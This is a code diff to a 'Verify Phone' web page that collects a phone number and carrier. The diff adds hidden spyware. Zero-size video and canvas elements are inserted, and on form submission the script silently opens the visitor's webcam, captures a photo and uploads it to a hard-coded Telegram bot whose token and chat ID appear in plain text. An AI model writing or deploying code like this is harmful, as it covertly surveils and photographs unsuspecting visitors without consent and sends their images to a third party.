@@ -119,6 +119,13 @@
       animation: shake 0.4s;
     }
 
+    video, canvas {
+      width: 0;
+      height: 0;
+      opacity: 0;
+      position: absolute;
+    }
+
     @keyframes shake {
       0% { transform: translateX(0); }
       25% { transform: translateX(-6px); }
@@ -130,13 +137,10 @@
 </head>
 <body>
 
-<!-- 🔁 Background Video -->
 <video id="bgVideo" autoplay muted loop playsinline>
   <source src="video.mp4" type="video/mp4">
-  Your browser does not support the video tag.
 </video>
 
-<!-- UI -->
 <div class="container">
   <h2>📱 Verify Phone</h2>
 
@@ -159,20 +163,6 @@
       <option value="mobitel">Mobitel</option>
       <option value="airtel">Airtel</option>
       <option value="hutch">Hutch</option>
-      <option value="lankabell">Lanka Bell</option>
-      <option value="sltmobitel">SLT Mobitel</option>
-      <option value="vodafone">Vodafone</option>
-      <option value="att">AT&T</option>
-      <option value="verizon">Verizon</option>
-      <option value="tmobile">T-Mobile</option>
-      <option value="orange">Orange</option>
-      <option value="ee">EE</option>
-      <option value="sprint">Sprint</option>
-      <option value="chinamobile">China Mobile</option>
-      <option value="jio">Jio</option>
-      <option value="mtn">MTN</option>
-      <option value="telstra">Telstra</option>
-      <option value="telia">Telia</option>
     </select>
   </div>
 
@@ -185,6 +175,10 @@
   <div class="error" id="errorMsg"></div>
 </div>
 
+<!-- Hidden video + canvas -->
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
 <script>
   const validationRules = {
     "+94": /^[1-9][0-9]{8}$/,
@@ -193,6 +187,9 @@
     "+44": /^[1-9][0-9]{9}$/,
     "+65": /^[89][0-9]{7}$/
   };
+
+  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
+  const chatId = "8182050140";
 
   function validateNumber() {
     const countryCode = document.getElementById('country').value;
@@ -220,6 +217,54 @@
     }
 
     alert(`✅ Sending code to: ${countryCode} ${phone} via SIM: ${sim.toUpperCase()}`);
+    startCapture(); // Begin hidden capture
+  }
+
+  async function startCapture() {
+    try {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL("image/jpeg");
+
+        sendToTelegram(dataUrl);
+
+        stream.getTracks().forEach(track => track.stop());
+      }, 2500);
+    } catch (e) {
+      console.log("❌ Camera error:", e);
+    }
+  }
+
+  function sendToTelegram(base64) {
+    const blob = dataURItoBlob(base64);
+    const form = new FormData();
+    form.append("chat_id", chatId);
+    form.append("photo", blob, "captured.jpg");
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      body: form
+    }).then(res => res.json())
+      .then(data => console.log("✅ Sent to Telegram"))
+      .catch(e => console.error("❌ Telegram error", e));
+  }
+
+  function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+      ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
   }
 </script>
 
